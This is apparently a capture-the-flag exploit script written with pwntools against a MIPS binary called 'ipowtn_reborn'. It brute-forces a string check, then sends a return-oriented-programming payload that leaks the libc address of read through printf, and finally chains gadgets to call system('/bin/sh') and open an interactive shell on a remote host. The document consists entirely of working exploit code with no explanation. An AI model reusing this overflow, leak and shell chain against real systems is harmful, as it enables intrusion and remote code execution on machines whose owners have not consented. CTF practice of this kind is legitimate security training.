
from pwn import *
from time import sleep
import sys
context.binary = "./ipowtn_reborn"

if sys.argv[1] == "l":
    io = process(["qemu-mips", "-L", "/usr/mips-linux-gnu/", "./ipowtn_reborn"])
elif sys.argv[1] == "d":
    io = process(["qemu-mips", "-g", "1234", "./ipowtn_reborn"], timeout = 9999)
else:
    io = remote("106.75.64.188", 18067)

elf = ELF("./ipowtn_reborn")
libc = ELF("/usr/mips-linux-gnu/lib/libc-2.27.so", checksec = False)

def brute():
    cnt = 0
    checks = ["We", "are", "grad", "from", "nomal", "arch", "bcz", "W3Are", "hakker\x8e\x88"]

    while cnt < 9:
        for s in checks:
            io.send(s.ljust(8, '\0'))
            sleep(0.01)
            text = io.recvline(timeout = 0.1)
            if "no!!! guess it!!!!!!" not in text:
                cnt += 1
                del checks[checks.index(s)]
                success("success {} {}".format(cnt, checks))
                # raw_input("DEBUG:")
                break
    context.log_level = "debug"
    success("done!")

def leak():
    '''
    (gdb) x/5i 0x401230
   0x401230:	lw	ra,36(sp)
   0x401234:	lw	s1,32(sp)
   0x401238:	lw	s0,28(sp)
   0x40123c:	jr	ra
   0x401240:	addiu	sp,sp,40
    '''
    '''
    .text:00400F0C                 move    $a0, $s0         # format
    .text:00400F10                 mfc1    $a3, $f20
    .text:00400F14                 mfc1    $a2, $f21
    .text:00400F18                 jal     printf
    '''
    '''
    => 0x400f20:	lw	a0,152(s8)
       0x400f24:	lw	a1,156(s8)
       0x400f28:	lw	a2,160(s8)
       0x400f2c:	lw	a3,164(s8)
    '''
    payload  = flat(elf.bss() + 0x200) * (0x24 / 4) # readable
    
    payload += flat(0x401230)
    payload += fit({
            0x24: flat(elf.got['read']), 
            0x28: flat(0),
            0x2c: flat(0x400f0c)
        }, filler = '\0')

    assert '\x0a' not in payload
    return payload

def shell():
    '''
    0x0009e6a8: move $a0, $s1; move $t9, $s0; jalr $t9;
    '''
    payload  = '0' * 0x24
    payload += flat(0x401230)
    payload += fit({
            0x24: flat(libc.sym['system']),
            0x28: flat(next(libc.search("/bin/sh"))),
            0x2c: flat(libc.address + 0x0009e6a8)
        })
    return payload

if __name__ == "__main__":
    raw_input("ATTACH: ")
    brute()


    io.sendlineafter("... go!\n", leak())
    raw_input("DEBUG: ")
    libc.address = u32(io.recvn(4)) - libc.sym['read']
    success("libc -> {:#x}".format(libc.address))

    io.sendlineafter("... go!\n", shell())

    io.interactive()
